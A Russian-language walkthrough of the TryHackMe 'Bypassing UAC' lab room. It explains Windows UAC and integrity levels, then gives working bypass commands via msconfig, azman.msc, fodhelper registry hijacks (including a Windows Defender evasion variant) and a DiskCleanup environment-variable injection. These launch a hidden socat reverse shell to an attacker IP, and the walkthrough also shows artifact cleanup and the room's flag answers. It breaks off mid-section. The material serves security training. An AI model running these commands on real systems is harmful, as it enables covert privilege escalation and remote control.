[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Bypassing UAC](https://tryhackme.com/r/room/bypassinguac) 

Всего 8 заданий:
## Задание 1
В этой комнате мы рассмотрим распространенные способы обхода функции безопасности, доступной в системах Windows, 
известной как  Контроль учетных записей ( UAC ).  Эта функция позволяет запускать любой процесс с низкими 
привилегиями независимо от того, кто его запускает (обычный пользователь или администратор).

С точки зрения злоумышленника, обход UAC необходим для выхода из крайне ограничительных сред и полного повышения 
привилегий на целевых хостах. Изучая методы обхода, мы также рассмотрим любые оповещения, которые могут быть вызваны,
и артефакты, которые могут быть созданы в целевой системе, которые синяя команда может обнаружить.

Цели комнаты
- Изучите различные методы обхода UAC, доступные злоумышленникам.
- Требования к помещению
Перед этим рекомендуется изучить раздел «Внутренние компоненты Windows».

### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```

## Задание 2
#### Что такое UAC ?
Контроль учетных записей пользователей (UAC) — это функция безопасности Windows, которая по умолчанию заставляет 
любой новый процесс запускаться в контексте безопасности непривилегированной учетной записи. Эта политика 
применяется к процессам, запущенным любым пользователем, включая самих администраторов. Идея заключается в том, что 
мы не можем полагаться исключительно на личность пользователя, чтобы определить, следует ли авторизовать некоторые 
действия.

Хотя это может показаться нелогичным, представьте себе случай, когда пользователь BOB неосознанно загружает 
вредоносное приложение из Интернета. Если BOB входит в группу администраторов, любое приложение, которое он 
запускает, унаследует его привилегии токена доступа. Таким образом, если BOB решит запустить вредоносное приложение, 
а UAC отключен, вредоносное приложение мгновенно получит привилегии администратора. Вместо этого вредоносное 
приложение будет ограничено неадминистративным токеном доступа, когда UAC включен.

#### Высота UAC
Если администратору необходимо выполнить привилегированную задачу, UAC предоставляет способ повышения привилегий. 
Повышение работает путем предоставления пользователю простого диалогового окна для подтверждения того, что он явно 
одобряет запуск приложения в административном контексте безопасности:


#### Уровни целостности
UAC — это обязательный контроль целостности (MIC), который представляет собой механизм, позволяющий различать 
пользователей, процессы и ресурсы, назначая каждому из них уровень целостности (IL). В общих чертах, пользователи 
или процессы с более высоким токеном доступа IL смогут получать доступ к ресурсам с более низкими или равными IL. 
MIC имеет приоритет над обычными списками DACL Windows, поэтому вы можете получить разрешение на доступ к ресурсу в 
соответствии с DACL, но это не будет иметь значения, если ваш IL недостаточно высок.

В Windows используются следующие 4 IL, упорядоченные от низшего к высшему:
- Низкий -	Обычно используется для взаимодействия с Интернетом (например, Internet Explorer). Имеет очень ограниченные 
  разрешения.
- Середина -	Назначается обычным пользователям и отфильтрованным токенам администраторов.
- Высокий -	Используется повышенными токенами администраторов, если включен UAC. Если UAC отключен, все 
  администраторы всегда будут использовать токен с высоким IL.
- Система -	Зарезервировано для использования системой.
Когда процессу требуется доступ к ресурсу, он наследует токен доступа вызывающего пользователя и его связанный IL. 
  То же самое происходит, если процесс разветвляет дочерний процесс.


#### Фильтрованные токены
Чтобы добиться такого разделения ролей, UAC обрабатывает обычных пользователей и администраторов немного по-разному 
во время входа в систему:
- Не-администраторы получат один токен доступа при входе в систему, который будет использоваться для всех задач, 
  выполняемых пользователем. Этот токен имеет средний IL.
- Администраторы получат два токена доступа:
  - Фильтрованный токен: токен с удаленными привилегиями администратора, используемый для обычных операций. Этот токен 
    имеет средний IL.
  - Повышенный токен: токен с полными привилегиями администратора, используемый, когда что-то нужно запустить с 
    административными привилегиями. Этот токен имеет высокий IL.
  Таким образом, администраторы будут использовать свой отфильтрованный токен, если только они явно не запросят 
    административные привилегии через UAC.

#### Открытие приложения обычным способом
При попытке открыть обычную консоль мы можем открыть ее как непривилегированный пользователь или как администратор. 
В зависимости от нашего выбора, порожденному процессу будет назначен токен уровня целостности Medium или High:

Если проанализировать оба процесса с помощью Process Hacker, то можно увидеть связанные токены и их различия:

Слева у вас есть отфильтрованный токен со средним IL и почти без назначенных привилегий. Справа вы можете видеть, 
что процесс выполняется с высоким IL и имеет гораздо больше доступных привилегий. Другое отличие, которое может быть 
не столь очевидным, заключается в том, что процесс со средним IL фактически лишен любых привилегий, связанных с 
принадлежностью к группе администраторов.



#### Настройки UAC
В зависимости от наших требований безопасности UAC можно настроить для работы на четырех различных уровнях уведомлений:
- Всегда уведомлять: уведомлять и запрашивать у пользователя разрешение при внесении изменений в настройки Windows или когда программа пытается установить приложения или внести изменения на компьютер.
- Уведомлять меня только тогда, когда программы пытаются внести изменения в мой компьютер: уведомлять и запрашивать у 
  пользователя авторизацию, когда программа пытается установить приложения или внести изменения в компьютер. Администраторы не будут получать запросы при изменении настроек Windows.
- Уведомлять меня только тогда, когда программы пытаются внести изменения в мой компьютер (не затемнять рабочий стол)
  : то же самое, что и выше, но не запускает запрос UAC на защищенном рабочем столе.
- Никогда не уведомлять: Отключить запрос UAC . Администраторы будут запускать все, используя токен с высокими 
  привилегиями.
По умолчанию UAC настроен на уровне  Уведомлять меня только тогда, когда программы пытаются внести изменения на мой 
  компьютер:

С точки зрения злоумышленника три нижних уровня безопасности эквивалентны, и только настройка «Всегда уведомлять» 
представляет собой разницу.



#### Внутреннее устройство UAC
В основе UAC лежит Application Information Service или Appinfo. Всякий раз, когда пользователю требуется повышение 
прав, происходит следующее:

- Пользователь запрашивает запуск приложения от имени администратора.
- Вызов API ShellExecute выполняется с помощью глагола runas.
- Запрос пересылается в Appinfo для обработки повышения прав.
- Манифест приложения проверяется на предмет разрешения AutoElevation (подробнее об этом позже).
- Appinfo запускает agree.exe , который показывает запрос UAC на защищенном рабочем столе. Защищенный рабочий стол — 
  это просто отдельный рабочий стол, который изолирует процессы от всего, что выполняется на рабочем столе 
  фактического пользователя, чтобы другие процессы не могли каким-либо образом вмешаться в запрос UAC.
- Если пользователь дает согласие на запуск приложения от имени администратора, служба Appinfo выполнит запрос с 
  использованием Elevated Token пользователя. Затем Appinfo установит идентификатор родительского процесса нового 
  процесса, чтобы указать на оболочку, из которой было запрошено повышение прав.


Обход UAC
С точки зрения злоумышленника могут быть ситуации, когда вы получаете удаленную оболочку для хоста Windows через 
Powershell или cmd.exe. Вы даже можете получить доступ через учетную запись, которая является частью группы 
администраторов, но когда вы пытаетесь создать пользователя-бэкдора для будущего доступа, вы получаете следующую 
ошибку:
```commandline
Powershell
PS C:\Users\attacker> net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.
```

Проверяя назначенные нам группы, мы можем подтвердить, что наш сеанс работает со средним IL, то есть мы фактически 
используем отфильтрованный токен:
```commandline
Powershell
PS C:\Users\attacker> whoami /groups
	
GROUP INFORMATION
-----------------

Group Name                                                    Attributes
============================================================= ==================================================
Everyone                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Group used for deny only
BUILTIN\Administrators                                        Group used for deny only
BUILTIN\Users                                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level
```

Даже когда мы получаем сеанс Powershell с администратором, UAC не позволяет нам выполнять какие-либо 
административные задачи, поскольку в настоящее время мы используем только отфильтрованный токен. Если мы хотим 
получить полный контроль над нашей целью, мы должны обойти UAC.

Достаточно интересно, что Microsoft не считает UAC границей безопасности, а скорее простым удобством для 
администратора, чтобы избежать ненужного запуска процессов с административными привилегиями. В этом смысле запрос 
UAC — это скорее напоминание пользователю о том, что он работает с высокими привилегиями, а не препятствие 
вредоносному ПО или злоумышленнику сделать это. Поскольку это не граница безопасности, любая техника обхода не 
считается уязвимостью для Microsoft, и поэтому некоторые из них остаются неисправленными по сей день.

В общем, большинство методов обхода основаны на том, что мы можем использовать процесс High IL для выполнения 
чего-либо от нашего имени. Поскольку любой процесс, созданный родительским процессом High IL, унаследует тот же 
уровень целостности, этого будет достаточно, чтобы получить повышенный токен, не требуя от нас прохождения запроса 
UAC.

Для всех сценариев, представленных в этой комнате, мы предполагаем, что у нас есть доступ к серверу с учетной 
записью администратора, но только с консоли Medium IL. Наша цель всегда будет заключаться в доступе к консоли High 
IL без прохождения через UAC.

### Ответьте на вопросы ниже
Какой наивысший уровень целостности (IL) доступен в Windows?
```commandline
system
```
Какой IL связан с повышенным токеном администратора?
```commandline
high
```
Каково полное название службы, отвечающей за обработку запросов на повышение прав UAC?
```commandline
application information service
```

## Задание 3
Начнем с рассмотрения обходов на основе графического интерфейса, поскольку они предоставляют простой способ понять 
основные концепции. Эти примеры обычно не применимы к реальным сценариям, поскольку они полагаются на то, что у нас 
есть доступ к графическому сеансу, из которого мы могли бы использовать стандартный UAC для повышения прав.

Нажмите кнопку «Запустить машину», чтобы развернуть виртуальную машину и подключиться к ней через RDP или в 
параллельном режиме в браузере:

`xfreerdp /v:MACHINE_IP /u:attacker /p:Password321`

Эта машина будет использоваться для всех задач в помещении.

Пример: msconfig
Наша цель — получить доступ к командной строке High IL без прохождения через UAC. Для начала откроем msconfig либо 
из меню «Пуск», либо из диалогового окна «Выполнить»:

Если мы проанализируем процесс msconfig с помощью Process Hacker (доступного на вашем рабочем столе), мы заметим 
кое-что интересное. Даже когда нам не было показано приглашение UAC, msconfig работает как процесс с высоким IL:

Это возможно благодаря функции, называемой автоподъемом, которая позволяет определенным двоичным файлам подниматься 
без необходимости взаимодействия с пользователем. Подробнее об этом позже.

Если бы мы могли заставить msconfig породить для нас оболочку, оболочка унаследовала бы тот же маркер доступа, 
который использует msconfig, и, следовательно, была бы запущена как процесс с высоким IL. Перейдя на вкладку Tools, 
мы можем найти опцию, которая позволяет сделать именно это:

Если мы нажмем «Запустить», мы получим командную строку с высоким IL без какого-либо взаимодействия с UAC.

Чтобы получить флаг msconfig, используйте полученную высокоинтегрированную консоль для выполнения:

Администратор: Командная строка
`C:\> C:\flags\GetFlag-msconfig.exe`

Пример из практики: azman.msc

Как и в случае с msconfig, azman.msc автоматически поднимется без необходимости взаимодействия с пользователем. Если 
мы найдем способ вызвать оболочку из этого процесса, мы обойдем UAC. Обратите внимание, что в отличие от msconfig, 
azman.msc не имеет встроенного способа вызвать оболочку. Мы можем легко преодолеть это, проявив немного креативности.

Сначала запустим azman.msc:

Мы можем подтвердить, что процесс с высоким IL был порожден с помощью Process Hacker. Обратите внимание, что все 
файлы .msc запускаются из mmc.exe (Microsoft Management Console):

Для запуска оболочки воспользуемся справкой приложения:

На экране справки щелкнем правой кнопкой мыши любую часть статьи справки и выберем «Просмотреть исходный код» :

Это породит процесс блокнота, который мы можем использовать для получения оболочки. Для этого перейдите в 
Файл->Открыть и убедитесь, что выбрали Все файлы в раскрывающемся списке в правом нижнем углу. Перейдите 
в C:\Windows\System32 и поиск cmd.exe и щелкните правой кнопкой мыши, чтобы выбрать «Открыть»:



Это снова обойдет UAC и даст нам доступ к командной строке с высокой степенью целостности. Вы можете проверить 
дерево процессов в Process Hacker, чтобы увидеть, как маркер высокой целостности передается из mmc (Microsoft 
Management Console, запущенная через Azman) вплоть до cmd.exe:



Чтобы получить флаг azman, используйте полученную высокоинтегрированную консоль для выполнения:

Администратор: Командная строка
`C:\> C:\flags\GetFlag-azman.exe`
### Ответьте на вопросы ниже
Какой флаг возвращается при запуске эксплойта msconfig?
```commandline
THM{UAC_HELLO_WORLD}
```
Какой флаг возвращается при запуске эксплойта azman.msc?
```commandline
THM{GUI_UAC_BYPASSED_AGAIN}
```

## Задание 4
#### AutoElevate
Как упоминалось ранее, некоторые исполняемые файлы могут автоматически повышаться, достигая высокого IL без 
вмешательства пользователя. Это касается большинства функций Панели управления и некоторых исполняемых файлов, 
предоставляемых Windows.

Для автоматического повышения уровня приложения необходимо соблюсти некоторые требования:
- Исполняемый файл должен быть подписан издателем Windows.
- Исполняемый файл должен находиться в доверенном каталоге, например%SystemRoot%/System32/или%ProgramFiles%/

В зависимости от типа заявки могут применяться дополнительные требования:

Исполняемые файлы (.exe) должны объявлять элемент autoElevate внутри своих манифестов. Чтобы проверить манифест 
файла, мы можем использовать sigcheck, инструмент, предоставляемый как часть пакета Sysinternals. Вы можете найти 
копию sigcheck на своем компьютере на C:\tools\ . Если мы проверим манифест на наличие msconfig.exe, мы найдем 
свойство autoElevate:
Командная строка
```commandline
C:\tools\> sigcheck64.exe -m c:/windows/system32/msconfig.exe
...
<asmv3:application>
	<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
		<dpiAware>true</dpiAware>
		<autoElevate>true</autoElevate>
	</asmv3:windowsSettings>
</asmv3:application>
```

- mmc.exe автоматически повысится в зависимости от оснастки .msc, которую запросит пользователь. Большинство файлов .
msc, включенных в Windows, будут автоматически повышаться.
- Windows хранит дополнительный список исполняемых файлов, которые автоматически повышаются, даже если это не 
  запрошено в манифесте. Этот список включает, например, pkgmgr.exe и spinstall.exe.
- COM-объекты также могут запрашивать автоматическое повышение прав, настроив некоторые разделы реестра ( 
  https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker ).


#### Пример из практики: Fodhelper
Fodhelper.exe — один из исполняемых файлов Windows по умолчанию, отвечающий за управление дополнительными функциями 
Windows, включая дополнительные языки, приложения, не установленные по умолчанию, или другие характеристики 
операционной системы. Как и большинство программ, используемых для настройки системы, fodhelper может автоматически 
повышать права при использовании настроек UAC по умолчанию, так что администраторам не будет предложено повышать 
права при выполнении стандартных административных задач. Хотя мы уже рассмотрели исполняемый файл autoElevate, в 
отличие от msconfig, fodhelper можно использовать не по назначению, не имея доступа к графическому интерфейсу.

С точки зрения злоумышленника это означает, что его можно использовать через удаленную оболочку средней целостности 
и использовать в полнофункциональном процессе высокой целостности. Эта конкретная техника была обнаружена 
@winscripting и использовалась в дикой природе вредоносным ПО Glupteba.

Что было замечено в fodhelper, так это то, что он ищет в реестре определенный интересующий нас ключ:

Когда Windows открывает файл, она проверяет реестр, чтобы узнать, какое приложение использовать. Реестр содержит 
ключ, известный как программный идентификатор ( ProgID ) для каждого типа файла, с которым связано соответствующее 
приложение. Допустим, вы пытаетесь открыть файл HTML. Часть реестра, известная как HKEY_CLASSES_ROOT, будет 
проверена, чтобы система знала, что она должна использовать ваш предпочтительный веб-клиент для его открытия. 
Команда для использования будет указана в `shell/open/command` Подключ для ProgID каждого файла. Возьмем ProgID 
"htmlfile" в качестве примера:



На самом деле HKEY_CLASSES_ROOT — это просто объединенное представление двух разных путей в реестре:
- HKEY_LOCAL_MACHINE\Программное обеспечение\Классы - Общесистемные ассоциации файлов
- HKEY_CURRENT_USER\Программное обеспечение\Классы - Ассоциации файлов активного пользователя


При проверке HKEY_CLASSES_ROOT, если есть пользовательская ассоциация в HKEY_CURRENT_USER (HKCU), она будет иметь 
  приоритет. Если пользовательская ассоциация не настроена, то вместо нее будет использоваться общесистемная 
  ассоциация в HKEY_LOCAL_MACHINE (HKLM). Таким образом, каждый пользователь может выбрать свои предпочтительные 
  приложения отдельно, если это необходимо.

Возвращаясь к fodhelper, мы теперь видим, что он пытается открыть файл под ProgID ms-settings. Создав ассоциацию для 
этого ProgID в контексте текущего пользователя в HKCU, мы переопределим общесистемную ассоциацию по умолчанию и, 
следовательно, будем контролировать, какая команда используется для открытия файла. Поскольку fodhelper является 
исполняемым файлом autoElevate, любой порождаемый им подпроцесс унаследует маркер высокой целостности, эффективно 
обходя UAC.



#### Собираем все вместе
Один из наших агентов установил бэкдор на целевом сервере для вашего удобства. Ему удалось создать учетную запись в 
группе администраторов, но UAC препятствует выполнению любых привилегированных задач. Чтобы получить флаг, ему нужно,
чтобы вы обошли UAC и получили полностью функциональную оболочку с высоким IL.

Для подключения к бэкдору можно использовать следующую команду:

`nc MACHINE_IP 9999`
После подключения мы проверяем, входит ли наш пользователь в группу администраторов и работает ли он со средним 
токеном целостности:

Оболочка атакующего
```commandline
user@kali$ nc MACHINE_IP 9999
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
myserver\attacker

C:\Windows\system32>net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users                

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

Мы устанавливаем требуемые значения реестра, чтобы связать класс ms-settings с обратной оболочкой. Для вашего 
удобства копию socat можно найти на `c:\tools\socat\`. Для установки необходимых ключей реестра из стандартной 
командной строки можно использовать следующие команды:

Командная строка
```commandline
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
```

Обратите внимание, что нам нужно создать пустое значение с именем DelegateExecute, чтобы ассоциация класса вступила 
в силу. Если это значение реестра отсутствует, операционная система проигнорирует команду и вместо этого будет 
использовать общесистемную ассоциацию класса.

Мы настраиваем прослушиватель с помощью netcat на нашей машине:
```commandline
nc -lvp 4444
```

А затем приступим к выполнению fodhelper.exe, что в свою очередь запустит выполнение нашей обратной оболочки:

Командная строка
```commandline
C:\> fodhelper.exe
```

Оболочка атакующего
```commandline
user@kali$ nc -lvp 4444      
Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Полученная оболочка работает с высокой степенью целостности, что свидетельствует о том, что нам удалось успешно 
обойти UAC.

Чтобы получить флаг fodhelper, используйте новую оболочку для выполнения:

Администратор: Командная строка
`C:\> C:\flags\GetFlag-fodhelper.exe`
Примечание: Имейте в виду, что флаг будет возвращен только в том случае, если вы успешно обошли UAC с помощью 
fodhelper и только из получившейся высокоинтегрированной оболочки.

#### Расчищаем наши следы
В результате выполнения этого эксплойта на целевой системе были созданы некоторые артефакты в виде ключей реестра. 
Чтобы избежать обнаружения, нам нужно убрать за собой с помощью следующей команды:

`reg delete HKCU\Software\Classes\ms-settings\ /f`
Примечание: Обязательно выполните данную команду, чтобы избежать помех при выполнении следующих задач.

### Ответьте на вопросы ниже
Какой флаг возвращается при запуске эксплойта fodhelper?
```commandline
THM{AUTOELEVATE4THEWIN}
```

## Задание 5
#### Защитник Windows
Для простоты, на машине, которую мы атакуем, отключен Защитник Windows. Но что бы произошло, если бы он был включен?

Сначала, используя подключение через графический интерфейс, перейдите на рабочий стол и дважды щелкните следующий 
значок, чтобы включить Защитник Windows:

Теперь попробуйте снова эксплуатировать fodhelper через бэкдор-соединение и посмотрите, что произойдет в графическом 
интерфейсе сервера. Так же, как вы меняете(default)значение 
в `HKCU\Software\Classes\ms-settings\Shell\Open\command` для вставки команды обратной оболочки появится уведомление 
Защитника Windows: 
Нажав на уведомление, мы можем проверить подробности оповещения, в которых упоминается попытка обхода UAC путем 
изменения значения реестра:

Если вы запросите соответствующее значение в реестре, вы заметите, что оно было стерто:

Командная строка
```commandline
C:\Windows\system32>reg query %REG_KEY% /v ""

HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    (Default)    REG_SZ    (value not set)
```

Хотя на данный момент может показаться, что наш эксплойт не будет работать при включенном Защитнике Windows, 
проверьте, что произойдет, если вы выполните те же команды, но с небольшим изменением (обязательно замените свой 
IP-адрес, где это необходимо):

Командная строка
```commandline
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    DelegateExecute    REG_SZ    
    (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes
```

Мы добавили быстрый запрос к проблемному значению реестра сразу после установки его в команду, необходимую для нашей 
обратной оболочки. Удивительно, но запрос выводит нашу команду нетронутой.  Мы все равно получаем оповещение от 
Защитника Windows, и через секунду проблемное значение реестра удаляется, как и ожидалось. Похоже, Защитнику Windows 
требуется некоторое время, чтобы предпринять действия по нашему эксплойту, поэтому давайте установим обратный 
прослушиватель на машине нашего злоумышленника:

`nc -lvp 4444`
И модифицируйте эксплойт для запуска fodhelper.exe сразу после установки значения реестра. Если команда выполняется 
достаточно быстро, она просто сработает  (не забудьте заменить свой IP-адрес, где это необходимо):

Командная строка
```commandline
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

В зависимости от вашей удачи, fodhelper может выполниться до того, как включится AV, вернув вам обратную оболочку. 
Если по какой-то причине это не сработает, имейте в виду, что этот метод ненадежен, поскольку он зависит от гонки 
между AV и вашей полезной нагрузкой, которые выполняются первыми. Если обратная оболочка не сработает, просто 
продолжайте и продолжайте с остальной частью комнаты, так как более последовательный способ обойти Защитника Windows 
будет дан ниже.

Оболочка атакующего
```commandline
user@kali$ nc -lvp 4444      
Listening on 0.0.0.0 4444
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Однако Windows Defender все еще предупреждает об обходе. Проблема с нашим текущим эксплойтом в том, что он дает мало 
возможностей для вариаций, поскольку для его срабатывания нам нужно написать определенные ключи реестра, что 
упрощает обнаружение Windows Defender. Но с этим еще предстоит что-то сделать.

#### Улучшение эксплойта fodhelper
@V3ded предложил вариант эксплойта fodhelper , в котором используются другие ключи реестра, но основной принцип тот же.

Вместо того, чтобы записывать нашу полезную нагрузку в `HKCU\Software\Classes\ms-settings\Shell\Open\command`, мы 
будем использовать `CurVer` запись в разделе реестра progID. Эта запись используется, когда у вас есть несколько 
экземпляров приложения с разными версиями, запущенными в одной системе. CurVer позволяет указать версию приложения 
по умолчанию, которая будет использоваться Windows при открытии заданного типа файла.

Для этого мы создадим запись в реестре для нового progID по нашему выбору (подойдет любое имя), а затем укажем 
запись CurVer в ms-settings progID на наш недавно созданный progID. Таким образом, когда fodhelper попытается 
открыть файл с использованием ms-settings progID, он заметит запись CurVer, указывающую на наш новый progID, и 
проверит ее, чтобы узнать, какую команду использовать.

Код эксплойта, предложенный @V3ded, использует Powershell для достижения этой цели. Вот его модифицированная версия, 
адаптированная для использования нашей обратной оболочки  (обязательно замените свой IP-адрес, где это необходимо):
```commandline
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

Этот эксплойт создает новый progID с именем .pwn и связывает нашу полезную нагрузку с командой, используемой при 
открытии таких файлов. Затем он указывает запись CurVer ms-settings на наш .pwn progID. Когда fodhelper пытается 
открыть программу ms-settings, он вместо этого будет указывать на .pwn progID и использовать связанную с ним команду.

Эта техника с большей вероятностью обойдет Защитника Windows, поскольку у нас больше свободы в том, куда поместить 
нашу полезную нагрузку, поскольку имя progID, который содержит нашу полезную нагрузку, совершенно произвольно. 
Давайте запустим новый обратный шелл на машине нашего злоумышленника:
```commandline
nc -lvp 4445
```

И выполнить эксплойт из нашего бэкдор-подключения как есть. В результате Защитник Windows выдаст еще одно оповещение,
которое ссылается на наши действия:

Хотя мы все еще обнаруживаемся, важно отметить, что иногда методы обнаружения, используемые антивирусным программным 
обеспечением, реализуются строго против опубликованного эксплойта, без учета возможных вариаций. Если мы переведем 
наш эксплойт из Powershell для использования cmd.exe, антивирус не будет выдавать никаких предупреждений  
(обязательно замените свой IP-адрес, где это необходимо):

Командная строка
```commandline
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```

И мы получаем высоконадежную обратную оболочку:

Оболочка атакующего
```commandline
user@kali$ nc -lvp 4445      
Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

Чтобы получить флаг fodhelper-curver, используйте новую оболочку для выполнения:

Администратор: Командная строка
`C:\> C:\flags\GetFlag-fodhelper-curver.exe`
Примечание: Имейте в виду, что флаг будет возвращен только в том случае, если вы успешно  обошли UAC через fodhelper 
и только из получившейся высокоинтегрированной оболочки через socat.

Расчищаем наши следы
В результате выполнения этого эксплойта в целевой системе были созданы некоторые артефакты, такие как ключи реестра. 
Чтобы избежать обнаружения, нам нужно убрать за собой с помощью следующих команд: 
```commandline
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

Примечание: Обязательно выполните указанные команды, чтобы избежать помех при выполнении следующих задач.

### Ответьте на вопросы ниже
Какой флаг возвращается при запуске эксплойта fodhelper-curver?
```commandline
THM{AV_UAC_BYPASS_4_ALL}
```

## Задание 6
#### Обход функции «Всегда уведомлять»
Как видно из предыдущей задачи, в конфигурациях Windows по умолчанию вы можете злоупотреблять приложениями, 
связанными с конфигурацией системы, чтобы обойти UAC, поскольку большинство этих приложений имеют флаг autoElevate, 
установленный в их манифестах. Однако, если UAC настроен на уровне «Всегда уведомлять», fodhelper и подобные 
приложения будут бесполезны, поскольку они потребуют от пользователя пройти через запрос UAC для повышения прав. Это 
предотвратит использование нескольких известных методов обхода, но не все потеряно.

Для следующей техники мы будем злоупотреблять запланированной задачей, которая может быть запущена любым 
пользователем, но будет выполняться с наивысшими привилегиями, доступными вызывающему. Запланированные задачи — это 
захватывающая цель. По замыслу они должны запускаться без какого-либо взаимодействия с пользователем (независимо от 
уровня безопасности UAC), поэтому запрос пользователя на повышение прав процесса вручную невозможен. Любые 
запланированные задачи, требующие повышения прав, получат его автоматически, без прохождения запроса UAC.

Пример: запланированная задача очистки диска
Примечание: Обязательно отключите Windows Defender для этой задачи, иначе у вас могут возникнуть некоторые трудности 
при запуске эксплойта.  Просто запустите предоставленный ярлык на рабочем столе вашего компьютера, чтобы отключить его.

Чтобы понять, почему мы выбираем «Очистку диска», давайте откроем Планировщик заданий и проверим конфигурацию задачи:

Здесь мы видим, что задача настроена на запуск с учетной записью Users, что означает, что она унаследует привилегии 
от вызывающего пользователя. Параметр Run with highest privileges будет использовать токен безопасности с наивысшими 
привилегиями, доступный вызывающему пользователю, который является токеном с высоким IL для администратора. Обратите 
внимание, что если обычный пользователь, не являющийся администратором, вызовет эту задачу, она будет выполнена 
только со средним IL, поскольку это токен с наивысшими привилегиями, доступный не администраторам, и, следовательно, 
обход не сработает.

Проверяя вкладки «Действия» и «Настройки», мы видим следующее:

Задачу можно запустить по требованию, выполнив следующую команду при вызове:

` %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`

Поскольку команда зависит от переменных среды, мы могли бы внедрять команды через них и выполнять их, запуская 
задачу DiskCleanup вручную.

К счастью для нас, мы можем переопределить %windir% переменную через реестр, создав запись в HKCU\Environment. Если мы 
хотим выполнить обратную оболочку с помощью socat, мы можем установить  %windir%  следующее (без кавычек):

`cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM `

В конце нашей команды мы добавляем "&REM " (заканчивающийся пробелом), чтобы прокомментировать то, что ставится 
после %windir% при расширении переменной среды, чтобы получить окончательную команду, используемую DiskCleanup. 
Результирующая команда будет такой (обязательно замените свой IP-адрес, где это необходимо):

`cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%`

Где все, что находится после «REM», игнорируется как комментарий.


#### Собираем все вместе
Давайте настроим прослушиватель для обратной оболочки с помощью nc:
`nc -lvp 4446`

Затем мы подключимся к предоставленному бэкдору через порт 9999:
`nc MACHINE_IP 9999`

И наконец, выполните следующие команды, чтобы записать нашу полезную нагрузку, %windir%а затем выполните задачу DiskCleanup  (обязательно замените свой IP-адрес, где это необходимо) :

Командная строка
```commandline
